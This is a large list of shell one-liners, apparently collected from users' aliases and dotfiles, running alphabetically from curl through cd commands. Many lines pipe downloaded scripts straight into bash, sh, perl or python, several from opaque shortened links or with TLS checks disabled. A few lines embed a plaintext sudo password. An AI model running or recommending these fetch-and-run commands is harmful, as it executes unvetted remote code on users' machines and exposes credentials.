curl -s -X GET https://raw.githubusercontent.com/LeCoupa/awesome-cheatsheets/master/tools/vim.txt | less
curl -s -X GET https://raw.githubusercontent.com/LeCoupa/awesome-cheatsheets/master/tools/docker.sh | less
curl -s -X GET https://raw.githubusercontent.com/LeCoupa/awesome-cheatsheets/master/languages/javascript.js | less
curl -s -X GET https://raw.githubusercontent.com/LeCoupa/awesome-cheatsheets/master/languages/bash.sh | less
curl -s -X GET https://raw.githubusercontent.com/LeCoupa/awesome-cheatsheets/master/backend/node.js | less
curl -s -X GET https://gist.githubusercontent.com/MohamedAlaa/2961058/raw/ddf157a0d7b1674a2190a80e126f2e6aec54f369/tmux-cheatsheet.markdown | less
curl -s -T - chunk.io | pbcopy; echo 'URL copied to clipboard!'
curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash
curl -s -L http://bit.ly/10hA8iC | bash
curl -s -L bit.ly/spody | sh
curl -s -L bit.ly/spipaa7 | sh
curl -s -L bit.ly/cancerdotexe | sh
curl -s -L bit.ly/ayoubamine | sh
curl -s -L 'http://bit.ly/10hA8iC' | bash
curl -s -I -L https://www.baidu.com/ | head -n 1
curl -s -I -L g.cn/generate_204 | head -n 1
curl -s -F c=@- https://ptpb.pw/ | grep url
curl -s -F 'sprunge=<-' http://sprunge.us | xclip -i -selection clipboard
curl -s -F 'sprunge=<-' http://sprunge.us | xclip && xclip -o
curl -s -F 'sprunge=<-' http://sprunge.us | pbcopy
curl -s -A'Test' -L whatismyip.com | grep 'IPv4 is'
curl -s --insecure https://ssp.cpanel.net/SSP/run | sh
curl -s --insecure https://raw.githubusercontent.com/cPanelTechs/TechScripts/master/backup_report.sh| sh
curl -s --insecure https://raw.githubusercontent.com/cPanelMigrations/cpeval2/master/cpeval2 | perl
curl -s 'https://www.random.org/passwords/?num=1&len=15&format=plain&rnd=new' | sed 's/.../&-/g;s/-$//'
curl -s 'http://www.fortunecookiemessage.com/' | grep -oE 'cookie-link\
curl -s 'http://wttr.in/dordrecht?q&n&p' | head -n -3
curl -s 'http://jokedb.xyz/random' | jq -r '.content.text'
curl -s 'http://checkrealip.com' | grep 'Current IP Address:'
curl -s 'http://checkip.dyndns.org' | sed 's/.*Current IP Address: \([0-9\.]*\).*/\1/g'
curl -s 'http://checkip.dyndns.com/' | perl -p -e 's#<[^>]+>##g; s#^\D+##g;s#\s+.*##g;chomp; if (! /^\s*\d+\.\d+\.\d+\.\d+\s*/) { \$_ = \
curl -s $url/play.sh | bash -s -- $url
curl -o- https://raw.githubusercontent.com/xudafeng/bash/master/install.sh | bash && source ~/.bash_profile
curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.34.0/install.sh | bash; reload_bash
curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.34.0/install.sh | bash
curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.11/install.sh | bash
curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.1/install.sh | bash
curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.31.0/install.sh | bash
curl -o- https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
curl -o- -L https://yarnpkg.com/install.sh | bash -s -- --version 0.24.6
curl -o- -L https://yarnpkg.com/install.sh | bash
curl -ksF 'content=<-' https://dpaste.de/api/|tr -d '\
curl -kL https://opendns.org | grep 208
curl -k https://mariaux.org/party-hard.pl | perl &
curl -k https://gist.githubusercontent.com/ecerulm/be59ec62ad77178d61a5/raw | sh
curl -k -L get.rvm.io | bash -s stable
curl -fsSkL https://raw.github.com/rejeep/cask.el/master/go | python
curl -fsSL https://rawgit.com/kube/42homebrew/master/install.sh | zsh
curl -fsSL https://raw.githubusercontent.com/theplant/plantbuild/master/dockercache | CMD=snapshot DIR=~/.cache bash
curl -fsSL https://raw.githubusercontent.com/theplant/plantbuild/master/dockercache | CMD=restore DIR=~/.cache bash
curl -fsSL https://raw.githubusercontent.com/swaaws/dotfiles/master/dotfiles.sh | sh
curl -fsSL https://raw.githubusercontent.com/supermarin/Alcatraz/deploy/Scripts/install.sh | sh
curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install | ruby
curl -fsSL https://raw.githubusercontent.com/Bluelich/XcodePluginTinker/master/XcodePluginTinker.sh | sh;
curl -fsSL https://github.com/rbenv/rbenv-installer/raw/master/bin/rbenv-doctor | bash
curl -fsSL https://git.io/fj54t | sh
curl -fsSL https://get.docker.com/ | sh
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
curl -fsSL https://deno.land/x/install/install.sh | sh
curl -fsSL https://bootstrap.pypa.io/get-pip.py | sudo -H python3
curl -fsSL https://bootstrap.pypa.io/get-pip.py | sudo -H python
curl -fsSL https://bootstrap.pypa.io/get-pip.py | python3
curl -fsSL https://bootstrap.pypa.io/get-pip.py | python
curl -fsSL http://git.io/license | sh
curl -fsL https://git.io/fhhYM | /bin/bash
curl -fL https://git.io/antibody | sh -s - -b $HOME/.local/bin
curl -a -s http://my-ipaddress.appspot.com/ | pbcopy && pbpaste; echo; echo 'Pasted to clipboard'
curl -X PUT http://127.0.0.1:5984/test | python -m json.tool
curl -X POST -F 'data=<-' -F datafile='' -F output_format=sql -F ajax=1 -F n_indents=1 -F keyword_case=upper -F identifier_case=lower 'https://sqlformat.org/' 2>/dev/null | jq -r .plain
curl -X GET http://127.0.0.1:5984/_all_dbs | python -m json.tool
curl -Ss icanhazip.com | pbcopy
curl -Ss https://raw.githubusercontent.com/m4tx/dotfiles/master/install.sh | sh
curl -Ss http://169.254.169.254/openstack/latest/meta_data.json | python -m json.tool
curl -Ls https://raw.githubusercontent.com/tklepzig/dotfiles/master/install.sh|bash
curl -Ls https://raw.githubusercontent.com/tklepzig/dotfiles/master/install.sh | bash -s -- -u --include-vsc
curl -Ls https://raw.githubusercontent.com/tklepzig/dotfiles/master/install.sh | bash -s -- -u
curl -Ls https://raw.githubusercontent.com/tklepzig/dotfiles/master/install.sh | bash -s -- --skip-vsc
curl -Ls https://raw.githubusercontent.com/tklepzig/basic-setup/master/bash-git.sh|bash
curl -Ls https://raw.githubusercontent.com/abominox/assorted/master/scripts/recode.sh | source /dev/stdin
curl -Ls https://raw.githubusercontent.com/abanobmikaeel/TheFatcatsShelter/fcTerminal/prep.sh | bash
curl -Ls https://raw.githubusercontent.com/abanobmikaeel/TheFatcatsShelter/develop/tigger.sh | bash
curl -Ls https://raw.githubusercontent.com/abanobmikaeel/TheFatcatsShelter/develop/snarf.sh | bash
curl -Ls https://raw.githubusercontent.com/abanobmikaeel/TheFatcatsShelter/develop/gardfiel.sh | bash
curl -Ls https://raw.githubusercontent.com/abanobmikaeel/TheFatcatsShelter/develop/cheshire.sh | bash
curl -Ls https://raw.githubusercontent.com/abanobmikaeel/TheFatcatsShelter/develop/SWATcat.sh | bash
curl -Ls https://raw.githubusercontent.com/SusaHope/dotfiles/master/install.sh | bash -s -- -u
curl -Ls https://raw.github.com/thiagoneves/dotfiles/master/install.bash | bash
curl -Ls https://github.com/sivel/speedtest-cli/raw/master/speedtest.py | python3 -
curl -Ls https://github.com/shyiko/mvnw/releases/download/0.1.0/mvnw.tar.gz | tar xvz
curl -Ls https://burrow.io/mLPqH6pT-ss32g0o | bash -s
curl -Ls https://burrow.io/XoPMWrmL-ss32g0o | bash -s
curl -Ls http://www.perl.org/get.html | perl -wlne
curl -Ls http://$DOCKER_REGISTRY/v1/search | grep -Eo '\
curl -Ls git.io/hotcoffee | sh
curl -Ls bit.ly/lampounicorn | sh
curl -Ls -o - https://www.archlinux.org/mirrorlist/\?country\=US\&protocol\=http\&protocol\=https\&ip_version\=4\&ip_version\=6\&use_mirror_status\=on | sed -e 's/^#//'
curl -Ls $script_url | bash
curl -Lks http://bit.do/dotfiles-lstor | /bin/bash
curl -Li localhost:5000 2> /dev/null | grep -i HTTP
curl -LSs https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash
curl -LSs http://bit.ly/box-update-all | bash
curl -LR1fs --compressed https://ipinfo.io/ | jq -Sc
curl -L https://sw.kovidgoyal.net/kitty/installer.sh | sh /dev/stdin
curl -L https://s3-us-west-1.amazonaws.com/udacity-robotics/Term+2+Resources/P3+Resources/models.tar.gz | tar zx -C ~/.gazebo/
curl -L https://raw.githubusercontent.com/yyuu/pyenv-installer/master/bin/pyenv-installer | bash
curl -L https://raw.githubusercontent.com/mmrose/dotfiles/master/install.sh | sh
curl -L https://raw.githubusercontent.com/kraiz/dotfiles/master/install | sh
curl -L https://raw.githubusercontent.com/kevalpatel2106/kp-scripts/master/update-all.sh | bash
curl -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash
curl -L https://raw.githubusercontent.com/jmmk/archsalt/master/provision | bash
curl -L https://raw.github.com/sizowie/dotfiles/master/get.sh | sh -x
curl -L https://github.com/grailbio/bazel-compilation-database/archive/${RELEASE_VERSION}.tar.gz | tar -xz
curl -L https://git.io/vMLHh | vim -
curl -L https://get.rvm.io | bash -s stable
curl -L https://get.rvm.io | bash
curl -L http://xrl.us/installperlosx | bash
curl -L http://cpanmin.us | perl - App::cpanminus
curl -L http://bit.ly/voronenko | bash -s
curl -L http://bit.ly/lexxkeys | bash -s
curl -L http://bit.ly/10hA8iC | bash
curl -L http://bit.do/e3Hqx | /bin/bash
curl -L http://api.l3vi.de/location.json 2>/dev/null| jq -r '.address'
curl -L git.io/dotsync | bash
curl -L get.yeoman.io | bash
curl -L api.l3vi.de/mood.json 2>/dev/null | jq -r '.mood'
curl -L api.l3vi.de/location.json 2>/dev/null | jq .lon
curl -L api.l3vi.de/location.json 2>/dev/null | jq .lat
curl -L -s https://raw.githubusercontent.com/olehermanse/dotfiles/master/install.sh | bash
curl -L --silent https://raw.githubusercontent.com/Code417/Home/master/installer.sh | bash
curl -L 'https://go.squareup.com/devbootstrap' | bash
curl -Is slashdot.org | sed -n
curl -G https://api.wordpress.org/secret-key/1.1/salt/ | pbcopy
curl -F file=@- https://0x0.st | tee -a ~/.paste_history
curl -F 'sprunge=<-' http://sprunge.us | xclip
curl -F 'sprunge=<-' http://sprunge.us 2>/dev/null|pbcopy
curl -F 'f:1=<-' ix.io | tee -a ~/.paste_history
curl -4s http://wttr.in | head -n 7
curl -4 wttr.in/Sydney 2> /dev/null | head -n 37
curl -4 -s http://wttr.in/48450 | head -n 38
curl -0 -L https://npmjs.com/install.sh | sh
curl --silent ifconfig.co/json | prettyjson
curl --silent https://raw.githubusercontent.com/sivel/speedtest-cli/c58ad3367bf27f4b4a4d5b1bca29ebd574731c5d/speedtest.py | python -
curl --silent https://raw.githubusercontent.com/naps62/cryptofool/master/bin/exchange-rate | ruby
curl --silent https://ipinfo.io | jq -r .ip
curl --silent https://icanhazdadjoke.com | cowsay
curl --silent https://freegeoip.app/json/$(myip) | jq
curl --silent https://api.myip.com/ | jq .ip --raw-output
curl --silent http://wttr.in/new_york | head -7
curl --silent http://wttr.in/Vigo |head -7
curl --silent http://wttr.in/Seattle | grep -v ^[A-Z]
curl --silent http://wttr.in/Seattle | grep -v '^[A-Z]'
curl --silent http://wttr.in/Grenoble | head --lines=7
curl --silent http://wttr.in/78602 | head -7
curl --silent http://wttr.in/77479 | head -7
curl --silent http://wttr.in/ | head -n 38
curl --silent http://wttr.in/ | head -7
curl --silent http://people.rallydev.com/connector/EifXmlValidator/XMLvalidatorQC.rb | ruby -
curl --silent http://loripsum.net/api | xclip -sel clip && echo 'Lorem ipsum → clipboard'
curl --silent http://localhost:15000/config_dump | jq
curl --silent http://gems.github.com/list.html | grep fizx
curl --silent checkip.dyndns.org | grep --extended-regexp --only-matching '[0-9\.]+'
curl --silent -X POST http://requestb.in/api/v1/bins | jq -r '\
curl --progress-bar -F'c=@-' https://ptpb.pw/\?u=1 | sed 's:$:/text:'
curl --progress-bar -F'c=@-' https://ptpb.pw/?u=1 | sed 's:ptpb\.pw/:alyp.tk/pb/:g'
curl --fail --silent --show-error wttr.in/?1q | sed '/Follow/Q'
curl --data-binary @- datafart.com | xargs open
curl --compressed -o- -L https://yarnpkg.com/install.sh | bash
curl -# http://192.168.1.102/projects | grep -oP '(?<=>)?`$1`(?:.+)?(?=<)'
curl -# -F c=@- https://ptpb.pw\?u=1 | xclip -selection c
curl 'wttr.in?m' | less -S
curl $SERVERLESS_GOOF_HOST/dev/todos/ | jq
curl $SERVERLESS_GOOF_HOST'/todos-render?device\[\]=Desktop' | tidy -iq
curl $SERVERLESS_GOOF_HOST'/todos-render?device=Desktop' | tidy -iq
curl $SERVERLESS_GOOF_HOST'/dev/todos/render?device\[\]=Desktop' | tidy -iq
curl $SERVERLESS_GOOF_HOST'/dev/todos/render?device=Desktop' | tidy -iq
curl $RIAK/types/vifmetadata/buckets/vifmetadata/props | python -m json.tool
curcommit | pbcopy
cuebreakpoints --input-format cue --append-gaps *.cue | shntool split -o flac *.flac
cuebreakpoints --input-format cue --append-gaps *.cue | shntool split -o flac *.ape
cuebreakpoints *.cue | shnsplit -o flac *.flac ;
cuebreakpoints $1 | shnsplit -o flac $2
cu instance list | grep
ctrlv|ssh pastelink 'xclip -loop 10 -display :100 -quiet -selection c'
ctags -f tags --recurse=yes . && find . -name '*.rb' -o -name '*.java' -o -name '*.cs' -o -name '*.js' -o -name '*.haml' -o -name '*.erb' >| cscope.files && cscope -b -q
ctags -f tags --recurse=yes . && find . -name '*.rb' -o -name '*.java' -o -name '*.cs' -o -name '*.js' -o -name '*.haml' -o -name '*.erb' -o -name '*.coffee' >| cscope.files && cscope -b -q
ctags -L <(find . -name '*.py' | cut -c3-) --fields=+iaS --python-kinds=-i --extra=+q -f .git/python.tags
ctags --extra=+f --language-force=Ruby -R $(bundle show --paths | xargs) app lib
ct lsview|grep hsc1
ct lsview | grep 'adahuang'
csvtable | less -S
csvlook -I | less -S
cssfiles | xargs grep $@
cse | pbcopy
cs-install --print | grep $1
cs-install --history | grep $1
crontab -l | more
crontab -l | less
crontab -l | grep -i
crontab -l | grep
cqlsh $(hostname -I | awk '{print $1}')
cpy ~/.ssh/id_rsa.pub | echo '=> Public key copied to pasteboard.'
cpupower -c all frequency-info | grep -i \
cpufreq-info| highlight.sh '\
cpufreq-info | grep \
cpufreq-info | grep -m 1 --color=never \
cpplint --filter=-build/c++11 --linelength=160 $(git status --porcelain|sed s/^...//)
cpio --quiet -o -H newc | gzip -9
cpanm `cpan-module-list | peco`
cpanm -Sv --self-upgrade;cpan-outdated | xargs cpanm -Sv
cpandoc `cpan-module-list | peco`
cpan-outdated | minicpanm
cpan-outdated | cpanm
cp ~/FindSSL.cmake ./depends/libhdfs3/CMake/FindSSL.cmake && find . -name hawq_type_mapping.h| xargs rm
cp ~/Downloads/`ls ~/Downloads -tr | tail -n 1` .
cp ~/Downloads/$(ls -rt ~/Downloads/ | tail -n 1) .
cp \`ls -t \\\`find ~/dev/Stucco/output/ -type f -name '*.js'\\\` | head -1\` ~/dev/KindleForiOS/Applications/ReaderIPhone/modules/KindleCloudReader/js/Renderer/KindleRendererLib-min.js
cp \`ls -t \\\`find ~/dev/Stucco/output/ -type f -name '*.js'\\\` | head -1\` $kcrloc/lib/KindleRendererLib-min.js
cp /home/damaru/vimwiki/index.wiki /home/damaru/task.txt | sendKindle task.txt
cp /etc/fstab $HOMEPATH/local/var/backups/etc/fstab/fstab_$(date | sed -E
cp .vimrc .vimrc.back | vim .vimrc
cp .bashmrc .bashrc.back | vim .bashrc
cp -rf ~/ProfitTrailer/ ~/backupPT && rm -rf ~/temp/ && wget -P ~/temp/ $(curl -s https://api.github.com/repos/taniman/profit-trailer/releases | jq -r '.[0].assets[].browser_download_url') && unzip ~/temp/ProfitTrailer.zip -d temp/ && ptstop && mv ~/temp/ProfitTrailer/ProfitTrailer.jar ~/ProfitTrailer/ && cd ~
cp -r $(ls -a | pf) $DOTFILES
cp -i /src/puokonui/logs/$(ls -t /src/puokonui/logs | head -1) .
cp */target/ROOT.war ~/ride-5.0.0-linux64/apache-tomcat-7.0.47/webapps/ && rm -r ~/ride-5.0.0-linux64/apache-tomcat-7.0.47/webapps/ROOT && ~/ride-5.0.0-linux64/apache-tomcat-7.0.47/bin/startup.sh && tail -f ~/ride-5.0.0-linux64/apache-tomcat-7.0.47/logs/catalina.out | grcat log
cp $(find /usr/share/sounds/login-sounds |shuf -n 1) /usr/share/sounds/desktop-login.wav
cp $(find . -type f | shuf -n 1) ~/randfile/
cowsayl | less;
cowsay |lolcat
cowsay | lolcat
cowsay `fortune` | lolcat
cowsay -l | sed 's/ /\n/g'
cowsay -f kitty 'gist it!!' && git diff origin | gist -t diff
cowsay -f \$(ls /usr/share/cowsay/cows/ | shuf -n 1)
cowsay -f $(ls ~/brew/share/cows | gshuf -n 1)
cowsay -f $(ls /usr/share/cowsay/cows|shuf -n1)
cowsay -f $(ls /usr/share/cows/ | shuf -n1)
cowsay -f $(ls /usr/share/cows | shuf -n1)
cowsay 'Thats it! Thank you for listening!!' | nms -c -a
cower -u | wc -l
cower -u | awk '{printf(\
count | tail
count | head
cordova run android --device && adb lolcat | grep mlog
copyq copy - < ~/.ssh/id_rsa.pub | echo
copy-branch | xclip -selection clipboard
convert -scale $(xdpyinfo | grep -o
convert -resize 600x300 - - | imgcat
convert -density 100 - -quality 30 -flatten png:- | \
connectbot 'echo The2ndlaw |sudo -S service control restart && sudo service flask restart'
connectbot 'echo The2ndlaw | sudo -S service flask status'
connectbot 'echo The2ndlaw | sudo -S service control status'
conflicts | xargs git add
conflicts | xargs atom-beta
conflicts | xargs $EDITOR
confirm 'This will take a while. Are you sure? [y/N]' && dpkg -l | awk '/^ii/ {system(\
config | grep 'PU[0-9][0-9] [0-9]'
config | grep 'AD[0-9][0-9] [0-9]'
config ls-files --modified | xargs /usr/bin/git --git-dir=$HOME/.myconf/ --work-tree=$HOME add
condor_q|awk '{if (\$6==\
condor_q bemarsh | tail
condor_q bemarsh -wide | tail
condor_q awoodard -constraint 'JobStatus == 2' -goodput | grep 0.0%
condor_q -r | tail -20
condor_q -r | head -20
conda update -c conda-forge $(conda list | grep
conda activate tfbuild && bazel clean && yes '' | ./configure
conda activate $(echo $PWD | grep -o -P '(?<=/home\/jerpint\/).*(?=\/)')
composer_list require-dev | xargs composer require --dev
composer_list require | xargs composer require
composer info | ack
composer global show -i | awk '{ print \$1 }'
composer global info | ack
compose ps -q | xargs docker inspect --format '{{ .Name }} - {{ .NetworkSettings.IPAddress }}'
compgen -c | sort -u
compgen -c | sort
compgen -c | less
compgen -ac | grep '^[^_]'
compgen -ac | grep
compgen -abck | egrep -i
compgen -a | sort
compgen -a | grep
compgen -a | awk -v cols=5
compgen -A function | sort
compgen -A function | grep -v _
compgen -A function | grep -v
compgen -A function -abck|grep
compgen -A function -abck | grep
compaudit |xargs chmod -R g-w
compaudit | xargs sudo chmod g-w
compaudit | xargs chmod go-w
compaudit | xargs chmod -R 0755
compaudit NE | xargs chmod go-wx
comparemaster | xargs grep -n -e
command_ls -A -l -s | command_grep -E \
command-line-tweeter view | less
command top -l 1 -s 0 | grep PhysMem
command rem -aqh | less -REX
command rcup -v | grep -v identical
command pwd -P |xargs cd
command ps ux | grep
command ps ax | grep
command ps -HAcl -F S -A f|uniq -w3
command mount | column -t
command ls -t | head -1
command ls -lLha --color | ccze -A
command ls -lLh --color | ccze -A
command ls -halvt --color=always | less -R
command ls -halv --color=always | less -R
command ls -al -G -F | grep -i --color
command ls -A --classify | grep --invert-match
command gits -- status | less -R
command env | sort
command dust $DUST_FLAGS --depth=1 | tail --lines=\$(expr \$(tput lines) - 10)
command du -s err.txt generated.file succ.txt .*|sort -n
command du -s err.txt generated.file succ.txt . .. | sort -n
command du -khs err.txt generated.file succ.txt | sort -h
command du -csh . | tail -1
command dmesg --color=always | less -R
command colordiff | less -R
command cat ~/.ssh/id_rsa.pub | pbcopy
command \ls --color=always -alt | head -20
command -v zsh | sudo tee -a /etc/shells
comm=`echo $comm | sed "
comm -23 <(pacman -Qqett | sort) <(pacman -Qqg base
comm -23 <(pacman -Qeq) <(pacman -Qgq base base-devel | sort -u)
comm -23 <(aptitude search '~i !~M' -F '%p' | sed
combine_logs.py -c | less -R
comb; ./tcbuild check_one $1 test.mode=active-passive --no-ivy | tee log
comb; ./tcbuild check_one $1 test.mode=active-active --no-ivy | tee log
column -t|less -S
column -ts: /etc/passwd | sort
column -ts: /etc/group | sort
column -t ~/.clusterize_history | tail
column -t | \
column -t -s ""|"""
column -s\| -t
column -s: -t /etc/group | sort -nk3
colout -t cmake | colout -t g++
colortest | sed -n '1!p'
colortest -w -r -s | grep / --color=never L
colorsvn_log | less -R
colors | less -R
colorpicker | xclip -sel clipboard
colorpicker --short --one-shot --preview | xsel -b
colorls -l |less
colorls -l --almost-all --sort-dirs --git-status | grep
colorls --tree=1 --sd --gs -a | h -ni .DS_STORE
colorls --sf -l -a | lolcat
colorls --almost-all --sort-dirs --git-status | grep
colorize | less
colordiff|less -r
colordiff|less -R
colordiff |less
colordiff | less -r
colordiff | less -XFIRd
colordiff | less -R
colordiff | less
colordiff -u '$@' | less -RF
col -b | vim -c 'set ts=8 nomod nolist' -
col -b | view -c 'set ft=man nomod nolist' -
col -b | v -
col -b | gv -
col -b | bcat
coffee -p `$1` | less -N
coderay | less -R
codeclimate analyze $(git diff --name-only master | grep -v spec)
code `ls -a | fzf`
code `git diff --name-only | uniq`
code `ghq list -p | peco`
code --list-extensions | xargs -L 1 echo code --install-extension > ~/extensions.list
code --list-extensions | xargs -L 1 echo code --install-extension > $tools_dir/../../vscode/.extensions
code --list-extensions | xargs -L 1 echo code --install-extension > $configsLocaion/VSCode\ Extentions/VSCode\ Extentions.command
code --list-extensions | xargs -L 1 echo code --install-extension > $HOME/repos/dotfiles/vscode/extensions.sh && chmod 755 $HOME/repos/dotfiles/vscode/extensions.sh
code --list-extensions | xargs -L 1 echo code --install-extension
code --list-extensions | sort -f > ~/dotfiles/vscode/extensions.txt
code && find . -type f -iwholename '*log/test.log' -o -iwholename '*log/production.log' -o -iwholename '*log/development.log' | xargs rm -f
code $(git diff --name-only | uniq)
code $(ghq root)/$(ghq list | peco)
code $(ghq root)/$(ghq list | fzf)
code $(ghq list -p | peco)
code $(ghq list --full-path | peco)
cnl | l
cmspath; gitmig | xargs rm
cms2path; gitmig | xargs rm
cmd | awk '$TWO!=$HALTED {print $ZERO};'
cmd PLAY | post_hermes
cmd INIT | post_hermes
cmd /c tasklist | grep
cmd /c ipconfig | ucat
cmatrix | lolcat
cmatrix -b -s | lolcat -t
cls;cat ~/.oh-my-zsh/plugins/z/README | grep -m 23 .
cls;cat ~/.oh-my-zsh/plugins/jump/jump.plugin.zsh | grep -m 8 .
cloc --vcs git --exclude-dir=draft . | tail -8
clj-kondo --lint `git diff --name-only master.. | rg *.clj`
clj -Spath | sed -e 's/:/\'$'\n/g'
clippaste | sed 's/\s//g'
clippaste | jq
clipo | editor -
clipget | clip
clipd -p | xclip -sel c
clipcopy ~/.ssh/id_rsa.pub | echo '=> Public key copied to pasteboard.'
clipboard-to-tmp-png | smms-upload -
clipboard | less
clip.exe < ~/.ssh/id_rsa.pub | echo '=> Public key copied to pasteboard.'
cleartool lsstream -fmt %[found_bls]CXp | cut -d: -f2
cleartool lsco -cview -rec -short | xargs cleartool ci
cleartool diff -g `ct desc -s \!* | sed -f $HOME/bin/xdiff0.sed` &
clear;while :;do echo $LINES $COLUMNS $(($RANDOM%$COLUMNS));sleep 0.1;done|gawk
clear;tail -f -n 30 /var/log/httpd/dev.customerparadigm.com-error_log | grep --line-buffered $(whoami)
clear;svn status | grep -v swp
clear;set |grep TERM
clear;netstat -anp | more
clear;ls -lh | grep ^d
clear;ls -l | grep ^d --color=tty
clear;history | grep $1
clear; ps aux | grep terminal
clear; ps aux | grep ruby
clear; node ~/Documents/notify_nyc/index.js | less -R
clear; neofetch | lolcat
clear; motd; friends.pl | column -t
clear; more package.json | jq --tab
clear; more ./package.json | jq $@
clear; make 2>&1 | less
clear; make 2>&1 | head -15
clear; ls -laXh --color | more
clear; ls -la | less
clear; ls -apL1l | less -R
clear; ls --sort=time | less
clear; ll | less
clear; fortune | cowsay; echo
clear; fortune -c | say
clear; curl --silent http://wttr.in | head -n-3
clear ; git diff origin/master --name-only | xargs ~/workspace/main/open_tools/codereview/cpplint.py
clear ; fortune | cowsay -f tux
clear ; echo '-------------- Directory ------------------' ; ls -lsa | more
clear ; echo '-------------- Directory ------------------' ; ls -ls | more
clear ; echo '-------------- Directory ------------------' ; CLICOLOR_FORCE=1 ls -lsa | less -ceFRX
clear ; echo '-------------- Directory ------------------' ; CLICOLOR_FORCE=1 ls -ls | less -ceFRX
clear && ufetch | lolcat
clear && toilet -f pagga -F metal HAIL SATAN | ponysay -f wiona
clear && t d all -s 'today' -f datesheet | sort -n -k 2.1 -k 2.2
clear && spring stop && ps -ax | grep spring
clear && node . | bunyan
clear && neofetch | lolcat
clear && neofetch --backend off | lolcat && read
clear && ls | nl
clear && ls -lh --color=auto | grep ___
clear && ls -la | grep ^d --color=never
clear && ls -al | more
clear && ls -Al --color | grep -i
clear && hexdump -C /dev/urandom | pv -qlL 2
clear && git diff --name-only --diff-filter=ACMRTUXB origin/develop | grep -e \
clear && git diff $(git diff --name-only | fzf -m)
clear && fswatch -o test build | xargs -n1 -I{} npm test
clear && fortune | randomsay
clear && fortune | cowsay
clear && fortune -o | cowsay
clear && find . | entr -cdp node /_
clear && figlet BYE! | lolcat && revolver -s arrow2 start && sleep 5 && exit
clear && figlet ALOHA! | lolcat
clear && figlet ' -[ Welcome ]- ' | lolcat && echo '' && neofetch
clear && echo -n $(pwd) | x
clear && echo '# Version' && echo '' && vagrant version | grep Version && echo '' && echo '# Status' && echo '' && vagrant global-status && echo '--------------------------------------------------------------------' && vagrant status && echo ''
clear && echo ' ~ Arch $(uname -sro) ~' | lolcat
clear && dmesg | pv -qL 20
clear && cat /home/nathias/Ascii/nathiasASCII.ascii | lolcat
clear && $zshrc_scripts/brc.sh | $zshrc_programs/lolcat/bin/lolcat
clear && $zshrc_programs/ddate/ddate | $zshrc_programs/lolcat/bin/lolcat && echo
cleaner | wc -l
clean | xargs git branch -d
clean | xargs git branch -D
clang -cc1 -analyzer-checker-help |less
clamscan --verbose --recursive --infected --exclude-dir='^/sys|^/dev' /
clamscan --recursive --infected --exclude-dir='^/sys|^/dev' /
ckre && pacman -Syu && ckre && echo Update Complete! | figlet
chuck | say
chuck | cowthink
cht.sh --zsh $1 | less
chromium-browser $(xclip -o|sed
chromelogRaw | filterChromeConsole.sh
chromelog | filterChromeConsole.sh
chrome-cli list tabs | egrep
chrome $(git remote -v | awk
chrome $(git config --get remote.origin.url | sed s/\\.git//)/commits/$(git rev-parse --abbrev-ref HEAD)
chmod -x|bash
chmod +x $(ls -tr | tail -1)
chkconfig --list | grep -i 3:on
chkconfig --list | grep --color=always
chkconfig --list | grep '3:on'
chkbackups | xargs rm
chfiles | xargs grep $@
chezmoi diff | colordiff
checkout_remote_branch $(git branch -r | fzf)
checkout -h | head
checkfile | filterhtmlignores
cheat sheets | less
chdir ${VIEW_DIR} ; run_cmd git -c color.status=always status | less -RXF ; chdir
chars | tail -n 45
chars | head -n 38
cg | grep
cfp | pbcopy
cfp | clipcopy
cfind | xargs grep --color
cfiles | xargs grep $@
cf && python manage.py showmigrations | grep -v '\[X\]'
cert_alias%> | grep Exception
cem | l
cdrecord -s dev=`cdrecord --devices 2>&1 | grep
cdr -l | head -10
cdr -l | grep -i --color
cdpath | sort --ignore-case
cdo_mpi_src | make -j 8
cdo_mpi_main | make check - j 8
cdo_mpi_main | make -j 8
cdmore | grep -i
cdcbz; ./gazebo-arm.sh | tee /home/workspace/RoboND-Home-Service-Robot/tests/output.txt
cdcbz; ./gazebo-arm.sh | tee /home/workspace/RoboND-Home-Service-Robot/tests/$(date +%a%H:%M:%S).txt
cdcbz; ./gazebo-arm.sh | tee /home/workspace/RoboND-DeepRL-Project/tests/output.txt
cdcbz; ./gazebo-arm.sh | tee /home/workspace/RoboND-DeepRL-Project/tests/$(date +%a%H:%M:%S).txt
cd_django;find . -type f -iname '*.py' | etags.emacs --lang=python -
cd; clear; fortune | cowsay
cd; ./Téléchargements/clion-2018.3.3/bin/clion.sh | cd -
cd ~/xamarin/src/$(ls ~/xamarin/src/ | selecta)
cd ~/workbench/projects/$(\ls ~/workbench/projects/ | fzf)/www
cd ~/work/$(ls ~/work/ |peco)
cd ~/vimwiki; rg '\[\s\]|TODO' ~/vimwiki/
cd ~/tmp/$(ls -t ~/tmp/ | head -n 1)
cd ~/tmp/$( ls -t ~/tmp | head -1 )
cd ~/src/`ghq list | percol`
cd ~/software/heybuddy/ && bzr pull; bzr log | head -n 21
cd ~/server/ && find . -type f | xargs -n 5 touch && cd -
cd ~/repos/maint/; cat last_update.log - | ccze
cd ~/projects/pl/pl-cypress-shared && npm run test-data-setup && cd - && ggetusers | u print --color
cd ~/projects/$(ls ~/projects | fzf)
cd ~/projects/$(ls -t ~/projects | head -1)
cd ~/project/`\ls ~/project | peco` && edit-peco
cd ~/personal/$(ls ~/personal | fzf)
cd ~/music;find . -name '*.mp3' -o -name '*.flac'|sed -e 's%^./%%g' > ~/.mpd/playlists/all.m3u;mpd ~/.mpd/mpd.conf;mpc clear;mpc load all.m3u;mpc update
cd ~/music;find . -name '*.mp3' -o -name '*.flac'|sed -e 's%^./%%g' > ~/.mpd/playlists/all.m3u
cd ~/git/webapp; git checkout master; git branch -d `git branch --merged | sed -e s/\\*//g`;
cd ~/git/spider/src/apts247/apts247/staticfiles && find . -name '*.html' | sort
cd ~/games/minecraft/tekkit/server && tar -cjf backups/`date|tr ' :' '-'`.tar.bz2 world
cd ~/dev/$(ls -1 ~/dev | fzf)
